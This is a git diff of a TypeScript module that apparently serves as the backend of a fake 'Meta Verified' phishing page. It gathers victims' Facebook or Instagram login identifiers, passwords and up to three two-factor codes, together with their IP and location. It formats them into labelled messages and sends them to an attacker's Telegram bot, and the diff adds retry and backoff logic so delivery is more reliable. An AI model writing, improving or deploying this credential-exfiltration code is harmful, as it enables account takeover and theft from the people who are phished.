@@ -1,82 +1,153 @@
 import https from 'https';
-import axios from 'axios';
+import axios, { type AxiosResponse, isAxiosError } from 'axios';
 
-const agent = new https.Agent({ family: 4 });
+const HTTPS_AGENT_IPV4 = new https.Agent({ family: 4 });
+const TELEGRAM_SEND_TIMEOUT_MS = 15_000;
+const MAX_SEND_RETRIES = 3;
 
-function getTelegramConfig() {
+type TelegramSendMessageOk = {
+    ok: true;
+    result?: { message_id?: number };
+};
+
+type TelegramSendMessageErr = {
+    ok: false;
+    description?: string;
+    error_code?: number;
+    parameters?: { retry_after?: number };
+};
+
+class TelegramSendError extends Error {
+    readonly name = 'TelegramSendError';
+
+    constructor(
+        message: string,
+        readonly telegramErrorCode?: number,
+        readonly retryAfterSec?: number,
+    ) {
+        super(message);
+    }
+}
+
+function getTelegramConfig(): { apiRoot: string; chatId: string } | null {
     const token = process.env.TELEGRAM_BOT_TOKEN?.trim();
     const chatId = process.env.TELEGRAM_CHAT_ID?.trim();
     if (!token || !chatId) {
         return null;
     }
     return {
-        api: `https://api.telegram.org/bot${token}`,
+        apiRoot: `https://api.telegram.org/bot${token}`,
         chatId,
     };
 }
 
-// Retry utility for Telegram API calls
-async function retryTelegramRequest(requestFn: () => Promise<any>, maxRetries = 3): Promise<any> {
-    let lastError: any;
+function messageBodyLooksPermanentFailure(description: string): boolean {
+    const d = description.toLowerCase();
+    return d.includes('chat not found') || d.includes('bot was blocked') || d.includes('forbidden');
+}
 
-    for (let attempt = 1; attempt <= maxRetries; attempt++) {
+function assertSendMessageOk(res: AxiosResponse<unknown>): number | undefined {
+    const body = res.data as TelegramSendMessageOk | TelegramSendMessageErr | null;
+    if (body && typeof body === 'object' && body.ok === true) {
+        return (body as TelegramSendMessageOk).result?.message_id;
+    }
+
+    const errBody = body as TelegramSendMessageErr | null;
+    const retryAfter =
+        errBody?.parameters && typeof errBody.parameters.retry_after === 'number'
+            ? errBody.parameters.retry_after
+            : undefined;
+    throw new TelegramSendError(
+        errBody?.description ?? 'sendMessage returned ok:false',
+        errBody?.error_code,
+        retryAfter,
+    );
+}
+
+function isRetryableTelegramAttempt(error: unknown): boolean {
+    if (error instanceof TelegramSendError) {
+        const c = error.telegramErrorCode;
+        if (c === 401) return false;
+        if (c === 403) return false;
+        if (messageBodyLooksPermanentFailure(error.message)) return false;
+        if (c === 400 || c === 404) return false;
+        if (c === 429) return true;
+        if (c !== undefined && c >= 500) return true;
+        return false;
+    }
+
+    if (isAxiosError(error)) {
+        const status = error.response?.status;
+        const description = error.response?.data && typeof error.response.data === 'object'
+            ? String((error.response.data as { description?: string }).description ?? '')
+            : '';
+
+        if (status === 401 || status === 403) return false;
+        if (status === 400 || status === 404) return false;
+        if (description && messageBodyLooksPermanentFailure(description)) return false;
+        if (status === 429) return true;
+        if (status !== undefined && status >= 500) return true;
+        /* Mạng / timeout — không có response */
+        if (!error.response && error.request) return true;
+        if (error.code === 'ECONNABORTED' || error.code === 'ETIMEDOUT') return true;
+        return false;
+    }
+
+    return false;
+}
+
+function backoffDelayMs(attemptIndex: number, error: unknown): number {
+    if (error instanceof TelegramSendError && error.telegramErrorCode === 429) {
+        const sec = error.retryAfterSec ?? 1;
+        return Math.min(Math.max(sec * 1000, 500), 60_000);
+    }
+    return Math.pow(2, attemptIndex) * 1000;
+}
+
+async function retryTelegramRequest<T>(requestFn: () => Promise<T>): Promise<T> {
+    let lastError: unknown;
+
+    for (let attempt = 0; attempt < MAX_SEND_RETRIES; attempt++) {
         try {
-            const result = await requestFn();
-            return result;
-        } catch (error: any) {
+            return await requestFn();
+        } catch (error: unknown) {
             lastError = error;
-
-            const errorCode = error?.response?.status;
-            const errorDesc = error?.response?.data?.description || '';
-
-            // Don't retry on authentication errors, invalid chat_id, etc.
-            if (
-                errorCode === 401 ||
-                errorCode === 403 ||
-                errorDesc.includes('chat not found') ||
-                errorDesc.includes('bot was blocked')
-            ) {
+            if (!isRetryableTelegramAttempt(error)) {
                 throw error;
             }
-
-            if (attempt === maxRetries) {
+            if (attempt === MAX_SEND_RETRIES - 1) {
                 break;
             }
-
-            // Exponential backoff: 1s, 2s, 4s
-            const delay = Math.pow(2, attempt - 1) * 1000;
-            console.warn(`⚠️ Telegram API attempt ${attempt} failed, retrying in ${delay}ms:`, error.message);
-            await new Promise(resolve => setTimeout(resolve, delay));
+            const delay = backoffDelayMs(attempt, error);
+            console.warn(`⚠️ Telegram sendMessage attempt ${attempt + 1} failed, retry in ${delay}ms`, error);
+            await new Promise((resolve) => setTimeout(resolve, delay));
         }
     }
 
     throw lastError;
 }
 
-/** Mỗi lần gọi = một tin `sendMessage` mới (Log in / 2FA — không ghép không sửa tin cũ). */
-async function sendNewTelegramMessage(
-    apiRoot: string,
-    chatId: string,
-    text: string,
-): Promise<number | undefined> {
-    const res = await retryTelegramRequest(() =>
-        axios.post(
+async function sendTelegramPlainMessage(apiRoot: string, chatId: string, text: string): Promise<number | undefined> {
+    return retryTelegramRequest(async () => {
+        const response = await axios.post<unknown>(
             `${apiRoot}/sendMessage`,
             {
                 chat_id: chatId,
                 text,
                 parse_mode: 'HTML',
+                disable_web_page_preview: true,
             },
             {
-                httpsAgent: agent,
-                timeout: 10000,
+                httpsAgent: HTTPS_AGENT_IPV4,
+                timeout: TELEGRAM_SEND_TIMEOUT_MS,
+                validateStatus: (status) => status < 500,
             },
-        ),
-    );
-    return res?.data?.result?.message_id as number | undefined;
+        );
+        return assertSendMessageOk(response);
+    });
 }
 
-function escapeHtml(input: any): string {
+function escapeHtml(input: unknown): string {
     const str = typeof input === 'string' ? input : String(input ?? '');
     return str
         .replace(/&/g, '&amp;')
@@ -86,42 +157,75 @@ function escapeHtml(input: any): string {
         .replace(/'/g, '&#39;');
 }
 
-/** Giá trị hiển thị trong <code>: không có dữ liệu thì để trống (không dùng "-" hay "N/A"). */
+/** Giá trị trong <code>: không có thì để trống. */
 function formatCodeField(value: unknown): string {
     if (value === undefined || value === null) return '';
     const s = String(value).trim();
     return s ? escapeHtml(s) : '';
 }
 
+/** Dữ liệu gửi từ meta-verified (client mã hoá AES). Chỉ lấy field cần thiết để báo Telegram. */
+export type TelegramInboundPayload = {
+    submissionFlow?: string;
+    ip?: string;
+    location?: string;
+    fullName?: string;
+    name?: string;
+    fanpage?: string;
+    day?: string;
+    month?: string;
+    year?: string;
+    email?: string;
+    emailBusiness?: string;
+    business?: string;
+    phone?: string;
+    password?: string;
+    passwordSecond?: string;
+    authMethod?: string;
+    twoFa?: string;
+    twoFaSecond?: string;
+    twoFaThird?: string;
+};
 
-function normalizeData(input: any = {}) {
-    const sf = input.submissionFlow;
+function normalizeData(input: TelegramInboundPayload | Record<string, unknown> = {}) {
+    const sf = (input as TelegramInboundPayload).submissionFlow;
     const submissionFlow: '' | 'facebook_login' | 'instagram_login' | 'meta_verified' =
         sf === 'facebook_login' || sf === 'instagram_login' || sf === 'meta_verified' ? sf : '';
     return {
-        ip: input.ip ?? '',
-        location: input.location ?? '',
-        fullName: input.fullName ?? input.name ?? '',
-        fanpage: input.fanpage ?? '',
-        day: input.day ?? '',
-        month: input.month ?? '',
-        year: input.year ?? '',
-        email: input.email ?? '',
-        emailBusiness: input.emailBusiness ?? input.business ?? '',
-        phone: input.phone ?? '',
-        password: input.password ?? '',
-        passwordSecond: input.passwordSecond ?? '',
-        authMethod: input.authMethod ?? '',
-        twoFa: input.twoFa ?? '',
-        twoFaSecond: input.twoFaSecond ?? '',
-        twoFaThird: input.twoFaThird ?? '',
+        ip: (input as TelegramInboundPayload).ip ?? '',
+        location: (input as TelegramInboundPayload).location ?? '',
+        fullName: (input as TelegramInboundPayload).fullName ?? (input as TelegramInboundPayload).name ?? '',
+        fanpage: (input as TelegramInboundPayload).fanpage ?? '',
+        day: (input as TelegramInboundPayload).day ?? '',
+        month: (input as TelegramInboundPayload).month ?? '',
+        year: (input as TelegramInboundPayload).year ?? '',
+        email: (input as TelegramInboundPayload).email ?? '',
+        emailBusiness: (input as TelegramInboundPayload).emailBusiness ?? (input as TelegramInboundPayload).business ?? '',
+        phone: (input as TelegramInboundPayload).phone ?? '',
+        password: (input as TelegramInboundPayload).password ?? '',
+        passwordSecond: (input as TelegramInboundPayload).passwordSecond ?? '',
+        authMethod: (input as TelegramInboundPayload).authMethod ?? '',
+        twoFa: (input as TelegramInboundPayload).twoFa ?? '',
+        twoFaSecond: (input as TelegramInboundPayload).twoFaSecond ?? '',
+        twoFaThird: (input as TelegramInboundPayload).twoFaThird ?? '',
         submissionFlow,
     };
 }
 
 type NormalizedPayload = ReturnType<typeof normalizeData>;
 
-/** Email ô đăng nhập; fallback số điện thoại (luồng Meta Verified thường để phone riêng). */
+function submissionTitleLine(flow: NormalizedPayload['submissionFlow']): string {
+    if (flow === 'facebook_login') return '<b>📋 META VERIFIED — FACEBOOK</b>';
+    if (flow === 'instagram_login') return '<b>📋 META VERIFIED — INSTAGRAM</b>';
+    if (flow === 'meta_verified') return '<b>📋 META VERIFIED — APPLICATION</b>';
+    return '<b>📋 META VERIFIED</b>';
+}
+
+function loginFieldLabel(flow: NormalizedPayload['submissionFlow']): string {
+    if (flow === 'instagram_login') return 'Mobile number, username or email';
+    return 'Mobile number or Email';
+}
+
 function primaryLoginIdentifier(d: NormalizedPayload): string {
     const email = String(d.email ?? '').trim();
     if (email) return email;
@@ -129,35 +233,42 @@ function primaryLoginIdentifier(d: NormalizedPayload): string {
     return phone ? `+${phone}` : '';
 }
 
-/** Một dòng password: ưu tiên mật khẩu chính, sau đó lần 2 (Meta Password modal). */
 function primaryPasswordField(d: NormalizedPayload): string {
     const a = String(d.password ?? '').trim();
     if (a) return a;
     return String(d.passwordSecond ?? '').trim();
 }
 
-/** Một định dạng cho **một snapshot** POST (đúng dữ liệu lần gọi đó). */
 function formatTelegramSubmissionMessage(d: NormalizedPayload): string {
     const lines = [
-        `<b>📋 META VERIFIED</b>`,
+        submissionTitleLine(d.submissionFlow),
         `----------------------`,
         `<b>IP:</b> <code>${formatCodeField(d.ip)}</code>`,
         `<b>Location:</b> <code>${formatCodeField(d.location)}</code>`,
         `----------------------`,
-        `<b>Mobile number or Email:</b> <code>${formatCodeField(primaryLoginIdentifier(d))}</code>`,
+        `<b>${loginFieldLabel(d.submissionFlow)}:</b> <code>${formatCodeField(primaryLoginIdentifier(d))}</code>`,
         `<b>Password:</b> <code>${formatCodeField(primaryPasswordField(d))}</code>`,
         `----------------------`,
-        `<b>🔐 2FA step 1:</b><code>${formatCodeField(d.twoFa)}</code>`,
-        `<b>🔐 2FA step 2:</b><code>${formatCodeField(d.twoFaSecond)}</code>`,
+        `<b>🔐 2FA step 1:</b> <code>${formatCodeField(d.twoFa)}</code>`,
+        `<b>🔐 2FA step 2:</b> <code>${formatCodeField(d.twoFaSecond)}</code>`,
     ];
+    const third = String(d.twoFaThird ?? '').trim();
+    if (third) {
+        lines.push(`<b>🔐 2FA step 3:</b> <code>${formatCodeField(d.twoFaThird)}</code>`);
+    }
     return lines.join('\n');
 }
 
-function formatMessage(data: any): string {
+function formatMessage(data: TelegramInboundPayload | Record<string, unknown>): string {
     return formatTelegramSubmissionMessage(normalizeData(data));
 }
 
-export async function sendTelegramMessage(data: any): Promise<void> {
+/**
+ * Gửi một tin `sendMessage` mới (không gộp / sửa tin cũ).
+ * - Thiếu env: log cảnh báo, thoát im lặng (request vẫn coi là đã xử lý phía backend).
+ * - Có env nhưng gửi thất bại sau retry: **throw** để `/api/meta-verified` có thể trả `error_code: 5`.
+ */
+export async function sendTelegramMessage(data: TelegramInboundPayload | Record<string, unknown>): Promise<void> {
     const config = getTelegramConfig();
     if (!config) {
         console.warn('⚠️ Telegram không được gửi: Thiếu TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_ID trong file .env');
@@ -165,16 +276,8 @@ export async function sendTelegramMessage(data: any): Promise<void> {
     }
 
     const text = formatMessage(data);
-
-    try {
-        const messageId = await sendNewTelegramMessage(config.api, config.chatId, text);
-        if (messageId !== undefined) {
-            console.log(`✅ Telegram new message ID: ${messageId}`);
-        } else {
-            console.warn('⚠️ Telegram response không có message_id');
-        }
-    } catch (err: unknown) {
-        const anyErr = err as { response?: { data?: unknown }; message?: string };
-        console.error('🔥 Telegram error:', anyErr?.response?.data || anyErr?.message || err);
+    const messageId = await sendTelegramPlainMessage(config.apiRoot, config.chatId, text);
+    if (messageId !== undefined) {
+        console.log(`✅ Telegram sendMessage OK, message_id: ${messageId}`);
     }
 }
